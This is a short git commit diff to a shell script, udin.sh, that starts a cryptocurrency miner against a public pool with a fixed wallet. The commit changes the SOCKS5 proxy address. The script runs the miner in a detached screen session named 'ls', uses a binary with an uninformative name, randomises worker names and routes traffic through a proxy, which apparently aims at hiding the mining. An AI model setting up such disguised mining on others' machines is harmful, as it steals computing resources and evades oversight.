9f6cec6c88d7d3b320af2bfe76018a578411d266
ajayy78 <87773034+ajayy78@users.noreply.github.com>
2021-08-05 19:56:44 +0700

    Update udin.sh

--- udin.sh
+++ udin.sh
@@ -6,5 +6,5 @@ screen -dmS ls
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RT8DNmxnDDRCLScadn7efqKuDLFvrB9unv
 WORKER=$(echo $(shuf -i 1-10 -n 1)ojann)
-PROXY=socks5://192.111.129.150:4145
+PROXY=socks5://192.252.215.2:4145	
 ./hayu -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
